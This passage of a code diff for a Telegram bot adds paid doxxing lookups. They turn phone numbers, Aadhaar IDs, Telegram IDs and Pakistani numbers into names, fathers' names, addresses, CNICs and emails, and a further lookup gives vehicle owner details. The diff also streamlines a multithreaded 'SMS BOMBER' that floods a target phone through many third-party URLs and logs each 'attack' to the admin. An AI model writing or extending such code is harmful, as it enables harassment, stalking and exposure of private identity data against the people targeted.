+        (100, "✅", "ACCESS GRANTED", "root@hacker:~$ SUCCESS")
     ]
     for idx, (percent, icon, status, cmd) in enumerate(frames):
         filled = percent // 10
@@ -184,10 +187,10 @@ def hacker_loading(chat_id, msg_id, query, search_type='NUMBER'):
                 f"`📡 METHOD : {search_type}`",
                 chat_id, msg_id, parse_mode='Markdown'
             )
-            time.sleep(0.2)
+            time.sleep(0.15)
         except: pass
 
-# ==================== API FUNCTIONS (FAST - timeout 8) ====================
+# ==================== API FUNCTIONS ====================
 def fetch_number(num):
     try:
         r = requests.get(f"{NUMBER_API_URL}?key={NUMBER_API_KEY}&number={num}", timeout=8)
@@ -195,9 +198,34 @@ def fetch_number(num):
         return None
     except: return None
 
-def fetch_number_special(phone):
+def fetch_special(phone):
+    """NEW: Special Lookup (api_b3a91f)"""
     try:
-        r = requests.get(f"{NUMBER_SPECIAL_URL}?key={NUMBER_API_KEY}&number={phone}", timeout=8)
+        r = requests.get(f"{SPECIAL_API_URL}&q={phone}", timeout=10)
+        if r.status_code == 200: return r.json()
+        return None
+    except: return None
+
+def fetch_tg_number(tg_id):
+    """NEW: TG to Number (api_6182a6)"""
+    try:
+        r = requests.get(f"{TG_NUMBER_API_URL}&q={tg_id}", timeout=10)
+        if r.status_code == 200: return r.json()
+        return None
+    except: return None
+
+def fetch_aadhaar_special(aadhaar_num):
+    """NEW: Aadhaar Special (api_e5ba5c)"""
+    try:
+        r = requests.get(f"{AADHAAR_SPECIAL_API_URL}&q={aadhaar_num}", timeout=10)
+        if r.status_code == 200: return r.json()
+        return None
+    except: return None
+
+def fetch_pakistan(pk_num):
+    """NEW: Pakistan Number (api_9bfe12)"""
+    try:
+        r = requests.get(f"{PAKISTAN_API_URL}&q={pk_num}", timeout=10)
         if r.status_code == 200: return r.json()
         return None
     except: return None
@@ -226,44 +254,89 @@ def fetch_vehicle_special(vehicle_num):
     except: return None
 
 # ==================== FORMAT RESULT ====================
-def format_result(data, query, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False):
-    if is_aadhaar:
+def format_result(data, query, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False,
+                  is_aadhaar_special=False, is_tg_number=False, is_pakistan=False):
+    if is_aadhaar_special:
+        if not data or data.get('status') != 'success': return "`❌ No data`"
+        records = data.get('data', [])
+        if not records: return "`❌ No records`"
+        text = f"`🆔 AADHAAR SPECIAL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🔎 Aadhaar: {query}`\n`📊 Total: {len(records)}`\n"
+        for i, rec in enumerate(records[:3], 1):
+            text += f"\n`📌 Record #{i}`\n"
+            text += f"`📱 Mobile: {rec.get('mobile', 'N/A')}`\n"
+            text += f"`👤 Name: {rec.get('name', 'N/A')}`\n"
+            text += f"`👨 Father: {rec.get('fname', 'N/A')}`\n"
+            text += f"`🏠 Address: {str(rec.get('address', 'N/A'))[:80]}`\n"
+            text += f"`📞 Alt: {rec.get('alt', 'N/A')}`\n"
+            text += f"`📡 Circle: {rec.get('circle', 'N/A')}`\n"
+            if rec.get('email'): text += f"`📧 Email: {rec.get('email')}`\n"
+        if len(records) > 3: text += f"\n`... and {len(records)-3} more`"
+        text += f"\n`🔐 {OWNER}`"
+        return text
+    
+    elif is_pakistan:
+        if not data or data.get('status') != 'success': return "`❌ No data`"
+        result = data.get('result', {})
+        records = result.get('records', []) if result else []
+        if not records: return "`❌ No records`"
+        text = f"`🇵🇰 PAKISTAN NUMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n`📱 Number: {result.get('number', query)}`\n`📊 Type: {result.get('type', 'N/A')}`\n`📋 Count: {result.get('count', len(records))}`\n"
+        for i, rec in enumerate(records[:3], 1):
+            text += f"\n`📌 Record #{i}`\n"
+            text += f"`👤 Name: {rec.get('name', 'N/A')}`\n"
+            text += f"`🆔 CNIC: {rec.get('cnic', 'N/A')}`\n"
+            text += f"`🏠 Address: {str(rec.get('address', 'N/A'))[:100]}`\n"
+        text += f"\n`🔐 {OWNER}`"
+        return text
+    
+    elif is_tg_number:
+        if not data or data.get('status') != 'success': return "`❌ No data`"
+        d = data.get('data', {})
+        if not d: return "`❌ No records`"
+        owner_num = d.get('Owner≠Number') or d.get('Owner') or 'N/A'
+        tg_id = d.get('TG -ID') or d.get('TG-ID') or query
+        country = d.get('Country-Code') or 'N/A'
+        return f"`📞 TG TO NUMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🆔 TG ID: {tg_id}`\n`📱 Owner Number: {owner_num}`\n`🌍 Country: {country}`\n`🔐 {OWNER}`"
+    
+    elif is_number_special:
+        # Special Lookup (api_b3a91f)
+        if not data or data.get('status') != 'success': return "`❌ No data`"
+        records = data.get('data', [])
+        if not records: return "`❌ No records`"
+        text = f"`🔍 SPECIAL LOOKUP`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🔎 Query: {query}`\n`📊 Total: {len(records)}`\n"
+        for i, rec in enumerate(records[:3], 1):
+            text += f"\n`📌 Record #{i}`\n"
+            text += f"`📱 Mobile: {rec.get('mobile', 'N/A')}`\n"
+            text += f"`👤 Name: {rec.get('name', 'N/A')}`\n"
+            text += f"`👨 Father: {rec.get('fname', 'N/A')}`\n"
+            text += f"`🏠 Address: {str(rec.get('address', 'N/A'))[:80]}`\n"
+            text += f"`📞 Alt: {rec.get('alt', 'N/A')}`\n"
+            text += f"`📡 Circle: {rec.get('circle', 'N/A')}`\n"
+            if rec.get('id'): text += f"`🆔 ID: {rec.get('id')}`\n"
+            if rec.get('email'): text += f"`📧 Email: {rec.get('email')}`\n"
+        if len(records) > 3: text += f"\n`... and {len(records)-3} more`"
+        text += f"\n`🔐 {OWNER}`"
+        return text
+    
+    elif is_aadhaar:
         if not data: return "`❌ No data`"
         info = {}
         if isinstance(data, dict):
             if 'data' in data and isinstance(data['data'], dict): info = data['data']
             elif 'result' in data and isinstance(data['result'], dict): info = data['result']
-            elif 'result' in data and isinstance(data['result'], list) and data['result']: info = data['result'][0]
             else: info = data
-        elif isinstance(data, list) and data: info = data[0]
-        name = info.get('name') or info.get('full_name') or 'N/A'
-        father = info.get('father') or info.get('fname') or info.get('father_name') or 'N/A'
-        aadhar = info.get('aadhaar') or info.get('aadhar') or info.get('id') or query
-        dob = info.get('dob') or info.get('DOB') or 'N/A'
-        gender = info.get('gender') or info.get('sex') or 'N/A'
-        address = info.get('address') or info.get('addr') or 'N/A'
-        phone = info.get('phone') or info.get('mobile') or 'N/A'
-        email = info.get('email') or info.get('mail') or 'N/A'
-        if name == 'N/A' and address == 'N/A' and phone == 'N/A':
-            return f"`❌ No records found`"
-        return f"`🆔 AADHAAR INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🆔 Aadhaar: {aadhar}`\n`👤 Name: {name}`\n`👨 Father: {father}`\n`📅 DOB: {dob}`\n`⚥ Gender: {gender}`\n`🏠 Address: {address}`\n`📱 Phone: {phone}`\n`📧 Email: {email}`\n`🔐 {OWNER}`"
-    elif is_number_special:
-        if not data: return "`❌ No data`"
-        if isinstance(data, dict):
-            if 'result' in data and isinstance(data['result'], list) and data['result']: info = data['result'][0]
-            elif 'data' in data and isinstance(data['data'], dict): info = data['data']
-            else: info = data
-        else: info = {}
         if not info or not info.get('name'): return "`❌ No records`"
-        return f"`📱 NUMBER INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`📱 Number: {query}`\n`👤 Name: {info.get('name', 'N/A')}`\n`👨 Father: {info.get('fname') or info.get('father', 'N/A')}`\n`🆔 Aadhar: {info.get('aadhar') or info.get('aadhaar', 'N/A')}`\n`🏠 Address: {info.get('address') or info.get('addr', 'N/A')}`\n`📡 Circle: {info.get('circle') or info.get('operator', 'N/A')}`\n`📧 Email: {info.get('email') or info.get('mail', 'N/A')}`\n`📞 Alt: {info.get('alt') or info.get('alternate', 'N/A')}`\n`🔐 {OWNER}`"
+        return f"`🆔 AADHAAR INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🆔 {info.get('aadhaar') or info.get('aadhar', query)}`\n`👤 Name: {info.get('name', 'N/A')}`\n`👨 Father: {info.get('father') or info.get('fname', 'N/A')}`\n`📅 DOB: {info.get('dob') or 'N/A'}`\n`⚥ Gender: {info.get('gender') or 'N/A'}`\n`🏠 Address: {info.get('address') or info.get('addr', 'N/A')}`\n`📱 Phone: {info.get('phone') or info.get('mobile', 'N/A')}`\n`📧 Email: {info.get('email') or 'N/A'}`\n`🔐 {OWNER}`"
+    
     elif is_special:
         if not data or not data.get('reg_no'): return "`❌ Not found`"
         i = data.get('response', {})
-        return f"`🚘 VEHICLE SPECIAL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🚘 Number: {data.get('reg_no', 'N/A')}`\n`👤 Owner: {i.get('ownerName', 'N/A')}`\n`🚗 Class: {i.get('vehicle_class', 'N/A')}`\n`⛽ Fuel: {i.get('fuel_type', 'N/A')}`\n`🔧 Engine: {i.get('engine_no', 'N/A')}`\n`🔩 Chassis: {i.get('chassis_no', 'N/A')}`\n`📅 Reg Date: {i.get('reg_date', 'N/A')}`\n`📋 Status: {i.get('status', 'N/A')}`\n`🏭 Model: {i.get('maker_model', 'N/A')}`\n`🔐 {OWNER}`"
+        return f"`🚘 VEHICLE SPECIAL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🚘 {data.get('reg_no', 'N/A')}`\n`👤 Owner: {i.get('ownerName', 'N/A')}`\n`🚗 Class: {i.get('vehicle_class', 'N/A')}`\n`⛽ Fuel: {i.get('fuel_type', 'N/A')}`\n`🔧 Engine: {i.get('engine_no', 'N/A')}`\n`🔩 Chassis: {i.get('chassis_no', 'N/A')}`\n`📅 Reg: {i.get('reg_date', 'N/A')}`\n`🏭 Model: {i.get('maker_model', 'N/A')}`\n`🔐 {OWNER}`"
+    
     elif is_vehicle:
         if not data or not data.get('regNo'): return "`❌ Not found`"
         i = data.get('response', {}); rto = i.get('rtoData', {})
-        return f"`🚗 VEHICLE INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🚘 Number: {data.get('regNo', 'N/A')}`\n`👤 Owner: {i.get('ownerName', 'N/A')}`\n`🏭 Company: {i.get('manufacturer', 'N/A')}`\n`🚗 Model: {i.get('vehicle', 'N/A')}`\n`📅 Reg Date: {i.get('regDate', 'N/A')}`\n`🏢 RTO: {rto.get('rtoCode', 'N/A')}`\n`🏠 Address: {i.get('presentAddress', 'N/A')}`\n`📱 Owner: {data.get('owner', 'N/A')}`\n`🔐 {OWNER}`"
+        return f"`🚗 VEHICLE INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🚘 {data.get('regNo', 'N/A')}`\n`👤 Owner: {i.get('ownerName', 'N/A')}`\n`🏭 Company: {i.get('manufacturer', 'N/A')}`\n`🚗 Model: {i.get('vehicle', 'N/A')}`\n`📅 Reg: {i.get('regDate', 'N/A')}`\n`🏢 RTO: {rto.get('rtoCode', 'N/A')}`\n`🏠 Address: {i.get('presentAddress', 'N/A')}`\n`🔐 {OWNER}`"
+    
     else:
         if not data: return "`❌ No data`"
         if isinstance(data, dict):
@@ -272,57 +345,23 @@ def format_result(data, query, is_vehicle=False, is_special=False, is_aadhaar=Fa
             else: info = data
         else: info = {}
         if not info or not info.get('name'): return "`❌ No records`"
-        return f"`📱 NUMBER INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`📱 Number: {query}`\n`👤 Name: {info.get('name', 'N/A')}`\n`👨 Father: {info.get('fname') or info.get('father', 'N/A')}`\n`🆔 Aadhar: {info.get('aadhar') or info.get('aadhaar', 'N/A')}`\n`🏠 Address: {info.get('address') or info.get('addr', 'N/A')}`\n`📡 Circle: {info.get('circle') or info.get('operator', 'N/A')}`\n`📧 Email: {info.get('email') or info.get('mail', 'N/A')}`\n`📞 Alt: {info.get('alt') or info.get('alternate', 'N/A')}`\n`🔐 {OWNER}`"
+        return f"`📱 NUMBER INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n`📱 {query}`\n`👤 Name: {info.get('name', 'N/A')}`\n`👨 Father: {info.get('fname') or info.get('father', 'N/A')}`\n`🆔 Aadhar: {info.get('aadhar') or info.get('aadhaar', 'N/A')}`\n`🏠 Address: {info.get('address') or info.get('addr', 'N/A')}`\n`📡 Circle: {info.get('circle') or info.get('operator', 'N/A')}`\n`📧 Email: {info.get('email') or 'N/A'}`\n`📞 Alt: {info.get('alt') or 'N/A'}`\n`🔐 {OWNER}`"
 
-def send_log(uid, un, query, data, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False):
+def send_log(uid, un, query, data, stype="NUMBER"):
     try:
-        if is_aadhaar:
-            if not data: return
-            info = data.get('data', data) if isinstance(data, dict) else {}
-            bot.send_message(ADMIN_ID, f"🆔 AADHAAR LOG\n👤 @{un or 'N/A'} ({uid})\n🔍 {query}\n👤 {info.get('name', 'N/A')}")
-        elif is_number_special or (not is_vehicle and not is_special and not is_aadhaar):
-            if not data: return
-            if isinstance(data, dict):
-                if 'result' in data and isinstance(data['result'], list) and data['result']: i = data['result'][0]
-                elif 'data' in data and isinstance(data['data'], dict): i = data['data']
-                else: i = data
-            else: i = {}
-            bot.send_message(ADMIN_ID, f"📊 NUMBER LOG\n👤 @{un or 'N/A'} ({uid})\n🔍 {query}\n📱 {i.get('name', 'N/A')}")
-        elif is_special:
-            bot.send_message(ADMIN_ID, f"🚘 SPECIAL LOG\n👤 @{un or 'N/A'} ({uid})\n🔍 {query}\n🚘 {data.get('reg_no', 'N/A')}")
-        elif is_vehicle:
-            i = data.get('response', {})
-            bot.send_message(ADMIN_ID, f"🚗 VEHICLE LOG\n👤 @{un or 'N/A'} ({uid})\n🔍 {query}\n🚘 {i.get('vehicle', 'N/A')}")
+        bot.send_message(ADMIN_ID, f"📊 {stype} LOG\n👤 @{un or 'N/A'} ({uid})\n🔍 {query}")
     except: pass
 
-# ==================== SMS BOMBER (OPTIMIZED PARALLEL) ====================
+# ==================== SMS BOMBER ====================
 def is_valid_number(num):
     return bool(re.match(r'^[6-9]\d{9}$', num))
 
 def send_bomber_request(url, number, message):
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive'
-    }
-    data_variants = [
-        {'number': number, 'message': message},
-        {'num': number, 'msg': message},
-        {'mobile': number, 'text': message},
-        {'phone': number, 'message': message},
-    ]
-    for data in data_variants:
+    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'}
+    for data in [{'number': number, 'message': message}, {'num': number, 'msg': message}, {'mobile': number, 'text': message}]:
         try:
-            r = requests.post(url, data=data, headers=headers, timeout=8)
-            if r.status_code in [200, 201, 202, 301, 302]:
-                return True
-        except: pass
-    for data in data_variants:
-        try:
-            r = requests.get(url, params=data, headers=headers, timeout=8)
-            if r.status_code in [200, 201, 202, 301, 302]:
-                return True
+            r = requests.post(url, data=data, headers=headers, timeout=6)
+            if r.status_code in [200, 201, 202, 301, 302]: return True
         except: pass
     return False
 
@@ -332,46 +371,24 @@ def run_sms_bomber(chat_id, msg_id, number, message):
     failed = 0
     lock = threading.Lock()
     
-    try:
-        bot.edit_message_text(
-            f"`💥 SMS BOMBER v3.0`\n"
-            f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
-            f"`📱 TARGET : {number}`\n"
-            f"`💬 MSG    : {message[:30]}`\n"
-            f"`🔢 APIs   : {total}`\n"
-            f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
-            f"`⏳ LAUNCHING...`",
-            chat_id, msg_id, parse_mode='Markdown'
-        )
-    except: pass
-    
-    time.sleep(0.2)
-    
     def hit_api(url, idx):
         nonlocal success, failed
         result = send_bomber_request(url, number, message)
         with lock:
             if result: success += 1
             else: failed += 1
-            if (success + failed) % 2 == 0:
+            if (success + failed) % 3 == 0:
                 done = success + failed
                 percent = int((done / total) * 100)
                 filled = percent // 10
                 bar = "🟥" * filled + "⬛" * (10 - filled)
                 try:
                     bot.edit_message_text(
-                        f"`💥 SMS BOMBER v3.0`\n"
-                        f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
-                        f"`📱 TARGET : {number}`\n"
-                        f"`💬 MSG    : {message[:30]}`\n"
-                        f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
-                        f"`🎯 HITTING : BOMBER-{idx}`\n"
+                        f"`💥 SMS BOMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
+                        f"`📱 {number}`\n`💬 {message[:25]}`\n"
+                        f"`━━━━━━━━━━━━━━━━━━━━━`\n"
                         f"{bar} `{percent}%`\n"
-                        f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
-                        f"`✅ HIT   : {success}`\n"
-                        f"`❌ MISS  : {failed}`\n"
-                        f"`🔢 DONE  : {done}/{total}`\n"
-                        f"`⚡ STATUS: BOMBING...`",
+                        f"`✅ {success} | ❌ {failed} | {done}/{total}`",
                         chat_id, msg_id, parse_mode='Markdown'
                     )
                 except: pass
@@ -379,53 +396,29 @@ def run_sms_bomber(chat_id, msg_id, number, message):
     threads = []
     for idx, url in enumerate(BOMBER_URLS, 1):
         t = threading.Thread(target=hit_api, args=(url, idx), daemon=True)
-        threads.append(t)
-        t.start()
-        time.sleep(0.05)
+        threads.append(t); t.start()
     
     for t in threads:
-        try: t.join(timeout=15)
+        try: t.join(timeout=10)
         except: pass
     
     rate = int((success / total) * 100) if total > 0 else 0
-    if rate >= 70:
-        verdict = "🔥 ATTACK SUCCESSFUL"
-        emoji = "💥"
-    elif rate >= 40:
-        verdict = "⚠️ PARTIAL SUCCESS"
-        emoji = "⚡"
-    else:
-        verdict = "❌ ATTACK FAILED"
-        emoji = "🚫"
+    verdict = "🔥 SUCCESSFUL" if rate >= 70 else "⚠️ PARTIAL" if rate >= 40 else "❌ FAILED"
     
     try:
         bot.edit_message_text(
-            f"`╔══════════════════════════════╗`\n"
-            f"`║  {emoji} ATTACK COMPLETE       ║`\n"
-            f"`╚══════════════════════════════╝`\n"
-            f"`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`\n"
-            f"`📱 TARGET : {number}`\n"
-            f"`💬 MSG    : {message[:50]}`\n"
-            f"`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`\n"
-            f"`✅ SUCCESS : {success}`\n"
-            f"`❌ FAILED  : {failed}`\n"
-            f"`📊 RATE    : {rate}%`\n"
-            f"`🎯 VERDICT : {verdict}`\n"
-            f"`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`\n"
-            f"`🔐 {OWNER}`",
+            f"`💥 ATTACK COMPLETE`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
+            f"`📱 {number}`\n`💬 {message[:40]}`\n"
+            f"`━━━━━━━━━━━━━━━━━━━━━`\n"
+            f"`✅ SUCCESS : {success}`\n`❌ FAILED  : {failed}`\n"
+            f"`📊 RATE    : {rate}%`\n`🎯 VERDICT : {verdict}`\n"
+            f"`━━━━━━━━━━━━━━━━━━━━━`\n`🔐 {OWNER}`",
             chat_id, msg_id, parse_mode='Markdown'
         )
     except: pass
     
     try:
-        bot.send_message(ADMIN_ID,
-            f"💥 BOMBER LOG\n"
-            f"👤 User: {chat_id}\n"
-            f"📱 Target: {number}\n"
-            f"💬 Msg: {message[:50]}\n"
-            f"✅ {success}/{total}\n"
-            f"❌ {failed}/{total}"
-        )
+        bot.send_message(ADMIN_ID, f"💥 BOMBER LOG\n👤 {chat_id}\n📱 {number}\n💬 {message}\n✅ {success}/{total}")
     except: pass
 
 # ==================== KEYBOARDS ====================
@@ -434,7 +427,6 @@ def welcome_kb(l):
     mk.add(InlineKeyboardButton("🎁 FREE Daily Coin Claim", callback_data="claim_coin"))
     mk.add(InlineKeyboardButton("💳 Buy Premium", callback_data="show_premium"))
     mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
-    mk.add(InlineKeyboardButton("📞 Contact Admin", url="https://t.me/Cyber_With_Ranjan"))
     return mk
 
 def premium_plans_kb(l):
@@ -457,41 +449,42 @@ def main_menu(l):
     mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
     mk.add(InlineKeyboardButton("📢 Channel", url=CHANNEL))
     mk.add(InlineKeyboardButton(L[l]['clear_btn'], callback_data="clear"))
-    mk.add(InlineKeyboardButton(L[l]['owner'], url="https://t.me/Cyber_With_Ranjan"))
     return mk
 
 def search_menu(l):
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(
-        InlineKeyboardButton(L[l]['number'], callback_data="info"),
-        InlineKeyboardButton(L[l]['vehicle'], callback_data="vehicle_info"),
-        InlineKeyboardButton(L[l]['vehicle_special'], callback_data="vehicle_special_info"),
-        InlineKeyboardButton(L[l]['aadhaar'], callback_data="aadhaar_info")
+        InlineKeyboardButton("📱 Number", callback_data="info"),
+        InlineKeyboardButton("🚗 Vehicle", callback_data="vehicle_info"),
+        InlineKeyboardButton("🚘 Vehicle Spl", callback_data="vehicle_special_info"),
+        InlineKeyboardButton("🆔 Aadhaar", callback_data="aadhaar_info"),
+        InlineKeyboardButton("🔍 Special", callback_data="special_info"),
+        InlineKeyboardButton("🆔 Aadhaar Spl", callback_data="aadhaar_special_info"),
+        InlineKeyboardButton("📞 TG to Num", callback_data="tg_number_info"),
+        InlineKeyboardButton("🇵🇰 Pakistan", callback_data="pakistan_info")
     )
-    mk.add(InlineKeyboardButton(L[l]['back'], callback_data="main_menu"))
+    mk.add(InlineKeyboardButton("🔙 Back", callback_data="main_menu"))
     return mk
 
 def group_menu(l):
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(
-        InlineKeyboardButton(L[l]['number'], callback_data="info"),
-        InlineKeyboardButton(L[l]['vehicle'], callback_data="vehicle_info"),
-        InlineKeyboardButton(L[l]['vehicle_special'], callback_data="vehicle_special_info"),
-        InlineKeyboardButton(L[l]['aadhaar'], callback_data="aadhaar_info")
+        InlineKeyboardButton("📱 Number", callback_data="info"),
+        InlineKeyboardButton("🚗 Vehicle", callback_data="vehicle_info"),
+        InlineKeyboardButton("🆔 Aadhaar", callback_data="aadhaar_info"),
+        InlineKeyboardButton("🔍 Special", callback_data="special_info")
     )
     mk.add(InlineKeyboardButton("💥 SMS Bomber", callback_data="bomber_start"))
-    mk.add(InlineKeyboardButton("💎 " + L[l]['premium'], callback_data="show_premium"))
+    mk.add(InlineKeyboardButton("💎 Premium", callback_data="show_premium"))
     mk.add(InlineKeyboardButton("🎁 Claim Coin", callback_data="claim_coin"))
     mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
-    mk.add(InlineKeyboardButton(L[l]['owner'], url="https://t.me/Cyber_With_Ranjan"))
     return mk
 
-def result_btn(query, lang, is_vehicle=False, is_special=False, is_aadhaar=False, is_number_special=False, message_id=None, is_group=False):
+def result_btn(query, lang, flags="0000000", message_id=None, is_group=False):
     mk = InlineKeyboardMarkup(row_width=2)
-    mk.add(InlineKeyboardButton("📊 JSON", callback_data=f"json_{query}_{is_vehicle}_{is_special}_{is_aadhaar}_{is_number_special}"))
+    mk.add(InlineKeyboardButton("📊 JSON", callback_data=f"json_{query}_{flags}"))
     mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
     mk.add(InlineKeyboardButton("🔗 Group", url=GROUP))
-    mk.add(InlineKeyboardButton("👨‍💻 Owner", url="https://t.me/Cyber_With_Ranjan"))
     mk.add(InlineKeyboardButton("🗑️ " + L[lang]['clear_btn'], callback_data="clear"))
     mk.add(InlineKeyboardButton("🔙 " + L[lang]['back'], callback_data="main_menu"))
     if is_group and message_id:
@@ -547,7 +540,7 @@ def claim_coin_cb(c):
         bot.answer_callback_query(c.id, f"🎉 +1 Coin! Total: {coins}")
         bot.send_message(c.message.chat.id, L[l]['coin_claimed'].format(coins=coins), reply_markup=main_menu(l), parse_mode='Markdown')
     else:
-        bot.answer_callback_query(c.id, "❌ Aaj ka already claim!", True)
+        bot.answer_callback_query(c.id, "❌ Already claimed!", True)
         bot.send_message(c.message.chat.id, L[l]['already_claimed'], reply_markup=main_menu(l))
 
 @bot.callback_query_handler(func=lambda c: c.data == "show_premium")
@@ -579,17 +572,13 @@ def pay_cb(c):
         bot.answer_callback_query(c.id, "❌ Invalid", True); return
     days, amount = plan_map[plan]
     bot.answer_callback_query(c.id, f"💳 {amount}")
-    text = (f"💳 **Payment Details**\n\n📦 Plan: {days} Days\n💰 Amount: {amount}\n🏦 UPI: `{UPI_ID}`\n\n"
-            f"📸 Scan QR & pay {amount}\n📤 Send screenshot to @Cyber_With_Ranjan")
+    text = f"💳 **Payment**\n\n📦 Plan: {days} Days\n💰 {amount}\n🏦 UPI: `{UPI_ID}`\n📤 Send screenshot to @Cyber_With_Ranjan"
     try:
         with open(QR_PATH, 'rb') as qr:
             bot.send_photo(c.message.chat.id, qr, caption=text, parse_mode='Markdown')
     except:
         bot.send_message(c.message.chat.id, text, parse_mode='Markdown')
-    mk = InlineKeyboardMarkup()
-    mk.add(InlineKeyboardButton("📞 Contact Admin", url="https://t.me/Cyber_With_Ranjan"))
-    mk.add(InlineKeyboardButton("🔙 Back", callback_data="show_premium"))
-    bot.send_message(c.message.chat.id, "📌 Send screenshot to admin.", reply_markup=mk)
+    bot.answer_callback_query(c.id, "💳")
 
 @bot.callback_query_handler(func=lambda c: c.data == "bomber_start")
 def bomber_start_cb(c):
@@ -600,11 +589,11 @@ def bomber_start_cb(c):
         mk = InlineKeyboardMarkup(row_width=1)
         mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
         mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
-        bot.send_message(c.message.chat.id, "🔒 **SMS BOMBER — Premium Only**\n\n💎 Premium required!", reply_markup=mk, parse_mode='Markdown')
+        bot.send_message(c.message.chat.id, "🔒 **SMS BOMBER — Premium Only**", reply_markup=mk, parse_mode='Markdown')
         return
     BOMBER_STATE[uid] = {"step": "number", "number": "", "message": ""}
     bot.answer_callback_query(c.id, "💥 SMS Bomber")
-    bot.send_message(c.message.chat.id, "💥 **SMS BOMBER v3.0**\n\n📱 Send 10-digit number:\nExample: `9876543210`\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
+    bot.send_message(c.message.chat.id, "💥 **SMS BOMBER v3.0**\n\n📱 Send 10-digit number:\n`9876543210`\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
 
 @bot.callback_query_handler(func=lambda c: c.data == "bomber_confirm")
 def bomber_confirm_cb(c):
@@ -635,8 +624,7 @@ def bomber_cancel_cb(c):
     try: bot.delete_message(c.message.chat.id, c.message.message_id)
     except: pass
     bot.answer_callback_query(c.id, "❌ Cancelled")
-    l = gl(uid)
-    bot.send_message(c.message.chat.id, "❌ SMS Bomber cancelled.", reply_markup=main_menu(l))
+    bot.send_message(c.message.chat.id, "❌ Cancelled.", reply_markup=main_menu(gl(uid)))
 
 @bot.callback_query_handler(func=lambda cb: cb.data == "profile")
 def profile_cb(cb):
@@ -652,7 +640,7 @@ def profile_cb(cb):
         searches = r[0] if r else 0
     except: pass
     l = gl(uid)
-    bot.answer_callback_query(cb.id, "👤 Profile")
+    bot.answer_callback_query(cb.id, "👤")
     bot.send_message(cb.message.chat.id, L[l]['profile'].format(uid=uid, coins=coins, prem=prem, searches=searches), parse_mode='Markdown')
 
 @bot.callback_query_handler(func=lambda c: c.data == "help")
@@ -671,8 +659,8 @@ def about_cb(c):
 def clear_cb(c):
     try:
         bot.delete_message(c.message.chat.id, c.message.message_id)
-        bot.answer_callback_query(c.id, "🗑️ Cleared!")
-    except: bot.answer_callback_query(c.id, "❌ Can't clear!", True)
+        bot.answer_callback_query(c.id, "🗑️")
+    except: bot.answer_callback_query(c.id, "❌", True)
 
 @bot.callback_query_handler(func=lambda c: c.data == "main_menu")
 def main_menu_cb(c):
@@ -701,7 +689,7 @@ def search_menu_cb(c):
         bot.send_message(c.message.chat.id, "🔍 " + L[l]['search'] + coins_info, reply_markup=search_menu(l), parse_mode='Markdown')
     bot.answer_callback_query(c.id, "🔍")
 
-@bot.callback_query_handler(func=lambda c: c.data in ["info", "vehicle_info", "vehicle_special_info", "aadhaar_info"])
+@bot.callback_query_handler(func=lambda c: c.data in ["info", "vehicle_info", "vehicle_special_info", "aadhaar_info", "special_info", "aadhaar_special_info", "tg_number_info", "pakistan_info"])
 def info_cb(c):
     l = gl(c.from_user.id)
     if not ip(c.from_user.id):
@@ -709,38 +697,55 @@ def info_cb(c):
         if coins <= 0:
             bot.answer_callback_query(c.id, "❌ No coins!", True)
             mk = InlineKeyboardMarkup(row_width=1)
-            mk.add(InlineKeyboardButton("🎁 Claim 1 FREE Coin", callback_data="claim_coin"))
+            mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
             mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
-            bot.send_message(c.message.chat.id, "❌ **No Coins Left!**\n\n🎁 Claim daily 1 FREE Coin", reply_markup=mk, parse_mode='Markdown')
+            bot.send_message(c.message.chat.id, "❌ No coins! Claim daily FREE coin.", reply_markup=mk)
             return
-    if c.data == "aadhaar_info": bot.send_message(c.message.chat.id, L[l]['enter_aadhaar'])
-    elif c.data == "vehicle_special_info": bot.send_message(c.message.chat.id, L[l]['enter_vehicle_special'])
-    elif c.data == "vehicle_info": bot.send_message(c.message.chat.id, L[l]['enter_vehicle'])
-    else: bot.send_message(c.message.chat.id, L[l]['enter_number'])
+    prompts = {
+        "aadhaar_info": L[l]['enter_aadhaar'],
+        "vehicle_special_info": L[l]['enter_vehicle_special'],
